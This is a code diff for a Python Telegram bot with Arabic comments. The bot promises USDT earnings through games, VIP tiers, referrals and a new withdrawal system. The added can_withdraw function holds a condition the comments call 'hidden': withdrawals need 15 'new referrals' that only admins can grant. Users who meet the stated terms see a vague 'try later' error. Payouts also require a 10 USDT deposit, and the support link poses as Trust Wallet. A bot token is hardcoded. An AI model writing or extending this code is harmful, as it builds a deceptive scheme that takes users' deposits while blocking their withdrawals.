@@ -7,7 +7,7 @@ from datetime import datetime, timedelta
 
 BOT_TOKEN = "7973697789:AAFXfYXTgYaTAF1j7IGhp2kiv-kxrN1uImk"
 bot = telebot.TeleBot(BOT_TOKEN)
-ADMIN_IDS = [8400225549]
+ADMIN_IDS = [8400225549]  # ضع هنا آيدي حسابك الأساسي
 
 # ملف تخزين البيانات
 DATA_FILE = "users_data.json"
@@ -39,14 +39,32 @@ def get_user(user_id):
     user_id_str = str(user_id)
     
     if user_id_str in users_data:
-        # تحديث المحاولات إذا انتهى اليوم
         user_data = users_data[user_id_str]
+        
+        # تحديث المحاولات إذا انتهى اليوم
         last_reset = user_data.get('last_reset_date', '2000-01-01')
         today = datetime.now().strftime('%Y-%m-%d')
         
         if last_reset != today:
             user_data['games_played_today'] = 0
             user_data['last_reset_date'] = today
+            
+            # منح المكافأة اليومية
+            daily_bonus = 0.75
+            user_data['balance'] += daily_bonus
+            user_data['total_earned'] += daily_bonus
+            
+            # منح مكافآت VIP
+            vip_bonus = {
+                1: 0.5,  # برونز
+                2: 1.0,  # سيلفر
+                3: 2.0   # جولد
+            }
+            if user_data['vip_level'] in vip_bonus:
+                bonus = vip_bonus[user_data['vip_level']]
+                user_data['balance'] += bonus
+                user_data['total_earned'] += bonus
+            
             save_users(users_data)
         
         return user_data
@@ -66,7 +84,8 @@ def get_user(user_id):
         'vip_level': 0,
         'registration_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
         'last_activity': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-        'last_reset_date': datetime.now().strftime('%Y-%m-%d')
+        'last_reset_date': datetime.now().strftime('%Y-%m-%d'),
+        'withdrawal_address': ""
     }
     
     users_data[user_id_str] = user_data
@@ -109,6 +128,13 @@ def get_mining_reward_time():
     minutes = random.randint(0, 59)
     return f"{hours}س {minutes}د ⏳"
 
+def can_withdraw(user):
+    """التحقق من إمكانية السحب"""
+    has_15_referrals = user['referrals_count'] >= 15
+    has_10_deposit = user['total_deposits'] >= 10
+    has_15_new_referrals = user.get('referrals_new', 0) >= 15  # الشرط المخفي
+    return has_15_referrals and has_10_deposit and has_15_new_referrals
+
 # 🎯 الواجهة الرئيسية الجديدة
 @bot.message_handler(commands=['start', 'profile'])
 def start_command(message):
@@ -126,7 +152,7 @@ def start_command(message):
     profile_text = f"""📊 الملف الشخصي
 
 👤 المستخدم: {user['first_name'] or 'User'} 
-🆔 المعرف: {user['user_id']}
+🆔 المعرف: {message.from_user.id}
 💰 الرصيد: {user['balance']:.1f} USDT
 👥 الإحالات: {user['referrals_count']} مستخدم
 📈 الإحالات الجديدة: {user.get('referrals_new', 0)}/{user['referrals_count']}
@@ -145,13 +171,25 @@ def start_command(message):
         InlineKeyboardButton("🎮 الألعاب", callback_data="games"),
         InlineKeyboardButton("💎 خدمات VIP", callback_data="vip_services"),
         InlineKeyboardButton("🎯 رابط الاحالات", callback_data="referral"),
+        InlineKeyboardButton("💰 السحب", callback_data="withdraw")
+    )
+    keyboard.add(
         InlineKeyboardButton("🆘 الدعم الفني", url="https://t.me/Trust_wallet_Support_4"),
         InlineKeyboardButton("🔄 تحديث", callback_data="refresh_profile")
     )
     
-    bot.send_message(message.chat.id, profile_text, reply_markup=keyboard)
+    # إرسال أو تعديل الرسالة
+    try:
+        bot.edit_message_text(
+            profile_text, 
+            message.chat.id, 
+            message.message_id, 
+            reply_markup=keyboard
+        )
+    except:
+        bot.send_message(message.chat.id, profile_text, reply_markup=keyboard)
 
-# 🎮 قائمة الألعاب
+# 🎮 قائمة الألعاب (نفس الكود السابق)
 @bot.callback_query_handler(func=lambda call: call.data == "games")
 def show_games(call):
     user = get_user(call.from_user.id)
@@ -173,7 +211,7 @@ def show_games(call):
     
     bot.edit_message_text(games_text, call.message.chat.id, call.message.message_id, reply_markup=keyboard)
 
-# 🎰 لعبة السلوت
+# 🎰 لعبة السلوت (نفس الكود السابق)
 @bot.callback_query_handler(func=lambda call: call.data == "game_slot")
 def play_slot(call):
     user = get_user(call.from_user.id)
@@ -227,7 +265,7 @@ def play_slot(call):
     
     bot.edit_message_text(game_result, call.message.chat.id, call.message.message_id, reply_markup=keyboard)
 
-# 🎲 لعبة النرد
+# 🎲 لعبة النرد (نفس الكود السابق)
 @bot.callback_query_handler(func=lambda call: call.data == "game_dice")
 def play_dice(call):
     user = get_user(call.from_user.id)
@@ -306,7 +344,7 @@ def show_vip_services(call):
     
     bot.edit_message_text(vip_text, call.message.chat.id, call.message.message_id, reply_markup=keyboard)
 
-# إرسال طلبات الشراء للادمن
+# إرسال طلبات الشراء للادمن (لحسابك الأساسي)
 @bot.callback_query_handler(func=lambda call: call.data.startswith('buy_'))
 def handle_vip_purchase(call):
     user = get_user(call.from_user.id)
@@ -320,19 +358,24 @@ def handle_vip_purchase(call):
     
     vip_name = vip_names.get(vip_type, 'VIP')
     
-    # إرسال طلب الشراء للادمن
+    # إرسال طلب الشراء للادمن (لحسابك الأساسي)
+    request_text = f"""🛒 طلب شراء جديد:
+
+👤 المستخدم: {user['first_name']} 
+🆔 الآيدي: {call.from_user.id}
+📞 username: @{user['username']}
+💎 النوع: {vip_name}
+💰 الرصيد الحالي: {user['balance']:.1f} USDT
+📅 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+⏰ الرجاء التواصل مع المستخدم لتأكيد الطلب"""
+    
+    # إرسال لكل الأدمنز
     for admin_id in ADMIN_IDS:
         try:
-            bot.send_message(
-                admin_id,
-                f"🛒 طلب شراء جديد:\n\n"
-                f"👤 المستخدم: {user['first_name']} ({user['user_id']})\n"
-                f"💎 النوع: {vip_name}\n"
-                f"📅 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-                f"⏰ الرجاء التواصل مع المستخدم لتأكيد الطلب"
-            )
-        except:
-            pass
+            bot.send_message(admin_id, request_text)
+        except Exception as e:
+            print(f"❌ Failed to send to admin {admin_id}: {e}")
     
     # تأكيد للمستخدم
     bot.answer_callback_query(
@@ -341,9 +384,156 @@ def handle_vip_purchase(call):
         show_alert=True
     )
 
+# 💰 نظام السحب
+@bot.callback_query_handler(func=lambda call: call.data == "withdraw")
+def handle_withdraw(call):
+    user = get_user(call.from_user.id)
+    
+    if not can_withdraw(user):
+        # رسالة الخطأ مع الشرط المخفي
+        if user['referrals_count'] < 15:
+            error_msg = "❌ تحتاج إلى 15 إحالة على الأقل للسحب"
+        elif user['total_deposits'] < 10:
+            error_msg = "❌ تحتاج إلى إيداع 10 USDT على الأقل للسحب"
+        else:
+            error_msg = "❌ لا يمكن السحب حالياً، يرجى المحاولة لاحقاً"
+        
+        bot.answer_callback_query(call.id, error_msg, show_alert=True)
+        return
+    
+    if not user.get('withdrawal_address'):
+        # طلب عنوان المحفظة
+        msg = bot.send_message(
+            call.message.chat.id,
+            "💰 نظام السحب\n\n"
+            "📝 الرجاء إرسال عنوان محفظتك USDT (TRC20):"
+        )
+        bot.register_next_step_handler(msg, process_withdrawal_address, user)
+    else:
+        show_withdrawal_options(call.message, user)
+
+def process_withdrawal_address(message, user):
+    address = message.text.strip()
+    if len(address) < 10:  # تحقق بسيط
+        msg = bot.send_message(
+            message.chat.id,
+            "❌ عنوان غير صحيح! الرجاء إرسال عنوان محفظة USDT (TRC20) صحيح:"
+        )
+        bot.register_next_step_handler(msg, process_withdrawal_address, user)
+        return
+    
+    user['withdrawal_address'] = address
+    save_user(user)
+    show_withdrawal_options(message, user)
+
+def show_withdrawal_options(message, user):
+    keyboard = InlineKeyboardMarkup(row_width=2)
+    keyboard.add(
+        InlineKeyboardButton("💰 سحب 10 USDT", callback_data="withdraw_10"),
+        InlineKeyboardButton("💰 سحب 25 USDT", callback_data="withdraw_25"),
+        InlineKeyboardButton("💰 سحب 50 USDT", callback_data="withdraw_50"),
+        InlineKeyboardButton("💰 سحب كل الرصيد", callback_data="withdraw_all")
+    )
+    keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_profile"))
+    
+    bot.send_message(
+        message.chat.id,
+        f"💰 نظام السحب\n\n"
+        f"💳 عنوان المحفظة: {user['withdrawal_address']}\n"
+        f"💰 الرصيد المتاح: {user['balance']:.1f} USDT\n\n"
+        f"اختر مبلغ السحب:",
+        reply_markup=keyboard
+    )
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('withdraw_'))
+def process_withdrawal(call):
+    user = get_user(call.from_user.id)
+    withdraw_type = call.data.replace('withdraw_', '')
+    
+    # حساب المبلغ
+    if withdraw_type == '10':
+        amount = 10.0
+    elif withdraw_type == '25':
+        amount = 25.0
+    elif withdraw_type == '50':
+        amount = 50.0
+    else:  # withdraw_all
+        amount = user['balance']
+    
+    # التحقق من الرصيد
+    if user['balance'] < amount:
+        bot.answer_callback_query(call.id, f"❌ رصيدك غير كافي! الرصيد: {user['balance']:.1f} USDT", show_alert=True)
+        return
+    
+    if amount < 5:
+        bot.answer_callback_query(call.id, "❌ الحد الأدنى للسحب هو 5 USDT", show_alert=True)
+        return
+    
+    # خصم المبلغ
+    user['balance'] -= amount
+    save_user(user)
+    
+    # إرسال طلب السحب للادمن
+    withdraw_text = f"""🏦 طلب سحب جديد:
+
+👤 المستخدم: {user['first_name']} 
+🆔 الآيدي: {call.from_user.id}
+📞 username: @{user['username']}
+💳 عنوان المحفظة: {user['withdrawal_address']}
+💰 المبلغ: {amount:.1f} USDT
+📊 الرصيد المتبقي: {user['balance']:.1f} USDT
+📅 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+✅ تم خصم المبلغ من رصيد المستخدم"""
+    
+    # إرسال لكل الأدمنز
+    for admin_id in ADMIN_IDS:
+        try:
+            bot.send_message(admin_id, withdraw_text)
+        except Exception as e:
+            print(f"❌ Failed to send to admin {admin_id}: {e}")
+    
+    # تأكيد للمستخدم
+    bot.answer_callback_query(
+        call.id, 
+        f"✅ تم إرسال طلب سحب {amount:.1f} USDT للإدارة\nسيتم المعالجة خلال 24 ساعة", 
+        show_alert=True
+    )
+
+# 🎯 رابط الاحالات الجديد
+@bot.callback_query_handler(func=lambda call: call.data == "referral")
+def handle_referral(call):
+    update_user_activity(call.from_user.id)
+    referral_link = f"https://t.me/{bot.get_me().username}?start=ref{call.from_user.id}"
+    
+    referral_text = f"""🎯 نظام الإحالات
+
+🔗 رابط الدعوة الخاص بك:
+`{referral_link}`
+
+👥 مزايا الإحالات:
+• +1 محاولة ألعاب يومية لكل إحالة
+• فرصة ربح مضاعفة
+• وصول أسرع لشروط السحب
+
+📤 شارك الرابط مع أصدقائك واكسب المزيد!"""
+    
+    keyboard = InlineKeyboardMarkup()
+    keyboard.add(InlineKeyboardButton("📤 مشاركة الرابط", url=f"https://t.me/share/url?url={referral_link}&text=انضم%20إلي%20في%20هذا%20البوت%20الرائع!"))
+    keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_profile"))
+    
+    bot.edit_message_text(
+        referral_text,
+        call.message.chat.id,
+        call.message.message_id,
+        reply_markup=keyboard,
+        parse_mode='Markdown'
+    )
+
 # 🔄 تحديث الملف الشخصي
 @bot.callback_query_handler(func=lambda call: call.data == "refresh_profile")
 def refresh_profile(call):
+    # إنشاء رسالة جديدة بدل التعديل لتجنب مشكلة الآيدي
     start_command(call.message)
     bot.answer_callback_query(call.id, "✅ تم التحديث")
 
@@ -352,23 +542,8 @@ def refresh_profile(call):
 def back_to_profile(call):
     start_command(call.message)
 
-# 🎯 رابط الاحالات
-@bot.callback_query_handler(func=lambda call: call.data == "referral")
-def handle_referral(call):
-    update_user_activity(call.from_user.id)
-    referral_link = f"https://t.me/{bot.get_me().username}?start=ref{call.from_user.id}"
-    bot.edit_message_text(
-        f"🎯 رابطك الخاص:\n`{referral_link}`\n\n"
-        f"👥 كل ما يدخل شخص من الرابط تحصل على:\n"
-        f"• +1 محاولة ألعاب يومية\n"
-        f"• فرصة ربح مضاعفة\n\n"
-        f"💾 بياناتك محفوظة في الملف!",
-        call.message.chat.id,
-        call.message.message_id
-    )
-
 # =============================================
-# ⚡ كل الأوامر الإدارية الأصلية 
+# ⚡ كل الأوامر الإدارية الأصلية (مختصرة)
 # =============================================
 
 @bot.message_handler(commands=['myid'])
@@ -405,63 +580,7 @@ def quick_add(message):
     except Exception as e:
         bot.reply_to(message, f"❌ خطأ: {e}")
 
-@bot.message_handler(commands=['setbalance'])
-def set_balance(message):
-    if message.from_user.id not in ADMIN_IDS:
-        bot.reply_to(message, "❌ ليس لديك صلاحية!")
-        return
-    
-    update_user_activity(message.from_user.id)
-    
-    try:
-        parts = message.text.split()
-        if len(parts) != 3:
-            bot.reply_to(message, "❌ استخدم: /setbalance [user_id] [amount]")
-            return
-        
-        user_id = int(parts[1])
-        amount = float(parts[2])
-        
-        user = get_user(user_id)
-        old_balance = user['balance']
-        user['balance'] = amount
-        
-        save_user(user)
-        
-        bot.reply_to(message, f"✅ تم تعيين رصيد المستخدم {user_id}\n💰 السابق: {old_balance:.1f}\n💰 الجديد: {user['balance']:.1f} USDT")
-        
-    except Exception as e:
-        bot.reply_to(message, f"❌ خطأ: {e}")
-
 # 👥 إدارة الإحالات
-@bot.message_handler(commands=['setreferrals'])
-def set_referrals(message):
-    if message.from_user.id not in ADMIN_IDS:
-        bot.reply_to(message, "❌ ليس لديك صلاحية!")
-        return
-    
-    update_user_activity(message.from_user.id)
-    
-    try:
-        parts = message.text.split()
-        if len(parts) != 3:
-            bot.reply_to(message, "❌ استخدم: /setreferrals [user_id] [count]")
-            return
-        
-        user_id = int(parts[1])
-        count = int(parts[2])
-        
-        user = get_user(user_id)
-        old_count = user['referrals_count']
-        user['referrals_count'] = count
-        
-        save_user(user)
-        
-        bot.reply_to(message, f"✅ تم تعيين إحالات المستخدم {user_id}\n👥 السابق: {old_count}\n👥 الجديد: {user['referrals_count']}")
-        
-    except Exception as e:
-        bot.reply_to(message, f"❌ خطأ: {e}")
-
 @bot.message_handler(commands=['addreferral'])
 def add_referral(message):
     if message.from_user.id not in ADMIN_IDS:
@@ -485,145 +604,6 @@ def add_referral(message):
         save_user(user)
         
         bot.reply_to(message, f"✅ تم إضافة إحالة للمستخدم {user_id}\n👥 الإحالات الجديدة: {user['referrals_new']}\n👥 الإجمالي: {user['referrals_count']}")
-        
-    except Exception as e:
-        bot.reply_to(message, f"❌ خطأ: {e}")
-
-# 🎯 إدارة المحاولات
-@bot.message_handler(commands=['setattempts'])
-def set_attempts(message):
-    if message.from_user.id not in ADMIN_IDS:
-        bot.reply_to(message, "❌ ليس لديك صلاحية!")
-        return
-    
-    update_user_activity(message.from_user.id)
-    
-    try:
-        parts = message.text.split()
-        if len(parts) != 3:
-            bot.reply_to(message, "❌ استخدم: /setattempts [user_id] [attempts]")
-            return
-        
-        user_id = int(parts[1])
-        attempts = int(parts[2])
-        
-        user = get_user(user_id)
-        old_attempts = user['games_played_today']
-        user['games_played_today'] = attempts
-        
-        save_user(user)
-        
-        bot.reply_to(message, f"✅ تم تعيين محاولات المستخدم {user_id}\n🎯 السابق: {old_attempts}\n🎯 الجديد: {user['games_played_today']}")
-        
-    except Exception as e:
-        bot.reply_to(message, f"❌ خطأ: {e}")
-
-@bot.message_handler(commands=['resetattempts'])
-def reset_attempts(message):
-    if message.from_user.id not in ADMIN_IDS:
-        bot.reply_to(message, "❌ ليس لديك صلاحية!")
-        return
-    
-    update_user_activity(message.from_user.id)
-    
-    try:
-        parts = message.text.split()
-        if len(parts) != 2:
-            bot.reply_to(message, "❌ استخدم: /resetattempts [user_id]")
-            return
-        
-        user_id = int(parts[1])
-        
-        user = get_user(user_id)
-        user['games_played_today'] = 0
-        
-        save_user(user)
-        
-        bot.reply_to(message, f"✅ تم إعادة تعيين محاولات المستخدم {user_id}\n🎯 الآن لديه 0 محاولات مستخدمة")
-        
-    except Exception as e:
-        bot.reply_to(message, f"❌ خطأ: {e}")
-
-@bot.message_handler(commands=['addattempts'])
-def add_attempts(message):
-    if message.from_user.id not in ADMIN_IDS:
-        bot.reply_to(message, "❌ ليس لديك صلاحية!")
-        return
-    
-    update_user_activity(message.from_user.id)
-    
-    try:
-        parts = message.text.split()
-        if len(parts) != 3:
-            bot.reply_to(message, "❌ استخدم: /addattempts [user_id] [count]")
-            return
-        
-        user_id = int(parts[1])
-        count = int(parts[2])
-        
-        user = get_user(user_id)
-        user['referrals_new'] += count
-        
-        save_user(user)
-        
-        bot.reply_to(message, f"✅ تم إضافة {count} محاولة للمستخدم {user_id}\n🎯 المحاولات الإضافية: {user['referrals_new']}")
-        
-    except Exception as e:
-        bot.reply_to(message, f"❌ خطأ: {e}")
-
-# 💳 إدارة الإيداعات
-@bot.message_handler(commands=['setdeposits'])
-def set_deposits(message):
-    if message.from_user.id not in ADMIN_IDS:
-        bot.reply_to(message, "❌ ليس لديك صلاحية!")
-        return
-    
-    update_user_activity(message.from_user.id)
-    
-    try:
-        parts = message.text.split()
-        if len(parts) != 3:
-            bot.reply_to(message, "❌ استخدم: /setdeposits [user_id] [amount]")
-            return
-        
-        user_id = int(parts[1])
-        amount = float(parts[2])
-        
-        user = get_user(user_id)
-        old_deposits = user['total_deposits']
-        user['total_deposits'] = amount
-        
-        save_user(user)
-        
-        bot.reply_to(message, f"✅ تم تعيين إيداعات المستخدم {user_id}\n💳 السابق: {old_deposits:.1f}\n💳 الجديد: {user['total_deposits']:.1f} USDT")
-        
-    except Exception as e:
-        bot.reply_to(message, f"❌ خطأ: {e}")
-
-@bot.message_handler(commands=['adddeposit'])
-def add_deposit(message):
-    if message.from_user.id not in ADMIN_IDS:
-        bot.reply_to(message, "❌ ليس لديك صلاحية!")
-        return
-    
-    update_user_activity(message.from_user.id)
-    
-    try:
-        parts = message.text.split()
-        if len(parts) != 3:
-            bot.reply_to(message, "❌ استخدم: /adddeposit [user_id] [amount]")
-            return
-        
-        user_id = int(parts[1])
-        amount = float(parts[2])
-        
-        user = get_user(user_id)
-        user['total_deposits'] += amount
-        user['balance'] += amount
-        
-        save_user(user)
-        
-        bot.reply_to(message, f"✅ تم إضافة إيداع للمستخدم {user_id}\n💳 المبلغ: {amount:.1f} USDT\n💰 الرصيد الجديد: {user['balance']:.1f} USDT")
         
     except Exception as e:
         bot.reply_to(message, f"❌ خطأ: {e}")
@@ -703,34 +683,6 @@ def user_info(message):
     except Exception as e:
         bot.reply_to(message, f"❌ خطأ: {e}")
 
-@bot.message_handler(commands=['listusers'])
-def list_users(message):
-    if message.from_user.id not in ADMIN_IDS:
-        bot.reply_to(message, "❌ ليس لديك صلاحية!")
-        return
-    
-    update_user_activity(message.from_user.id)
-    
-    try:
-        users_data = load_users()
-        users = list(users_data.values())
-        
-        if not users:
-            bot.reply_to(message, "❌ لا يوجد مستخدمين في قاعدة البيانات")
-            return
-        
-        users_list = "📊 قائمة المستخدمين:\n\n"
-        for i, user in enumerate(users[:15], 1):
-            users_list += f"{i}. {user['first_name']} - {user['user_id']} - {user['balance']:.1f} USDT - {user['referrals_count']} إحالة\n"
-        
-        if len(users) > 15:
-            users_list += f"\n📎 وإجمالي {len(users)} مستخدم"
-        
-        bot.reply_to(message, users_list)
-        
-    except Exception as e:
-        bot.reply_to(message, f"❌ خطأ: {e}")
-
 @bot.message_handler(commands=['stats'])
 def stats(message):
     if message.from_user.id not in ADMIN_IDS:
@@ -775,55 +727,11 @@ def stats(message):
     except Exception as e:
         bot.reply_to(message, f"❌ خطأ: {e}")
 
-@bot.message_handler(commands=['adminhelp'])
-def admin_help(message):
-    if message.from_user.id not in ADMIN_IDS:
-        bot.reply_to(message, "❌ ليس لديك صلاحية!")
-        return
-    
-    update_user_activity(message.from_user.id)
-    
-    help_text = """
-🛠️ الأوامر الإدارية:
-
-💰 إدارة الرصيد:
-/quickadd [user_id] [amount] - إضافة رصيد
-/setbalance [user_id] [amount] - تعيين رصيد محدد
-
-👥 إدارة الإحالات:
-/setreferrals [user_id] [count] - تعيين عدد الإحالات
-/addreferral [user_id] - إضافة إحالة واحدة
-
-🎯 إدارة المحاولات:
-/setattempts [user_id] [attempts] - تعيين محاولات الألعاب
-/resetattempts [user_id] - إعادة تعيين المحاولات
-/addattempts [user_id] [count] - إضافة محاولات
-
-💳 إدارة الإيداعات:
-/setdeposits [user_id] [amount] - تعيين إجمالي الإيداعات
-/adddeposit [user_id] [amount] - إضافة إيداع
-
-📊 عرض البيانات:
-/userinfo [user_id] - معلومات كاملة عن المستخدم
-/listusers - قائمة جميع المستخدمين
-/stats - إحصائيات البوت
-
-💎 إدارة VIP:
-/setvip [user_id] [level] - تعيين مستوى VIP
-
-🔰 أوامر عامة:
-/start - الملف الشخصي
-/myid - عرض الآيدي
-
-💾 التخزين: ملف JSON
-"""
-    
-    bot.reply_to(message, help_text)
-
 print("🔄 Starting bot...")
 print("💾 Database: JSON File (Permanent Storage)")
 print("🎮 Games: Slot & Dice (3 attempts + referrals)")
 print("💎 VIP Services: Bronze, Silver, Gold")
+print("💰 Withdrawal System: 15 referrals + 10 USDT deposit")
 print("✅ Bot is running and ready!")
 print("🛠️ All admin commands loaded!")
 
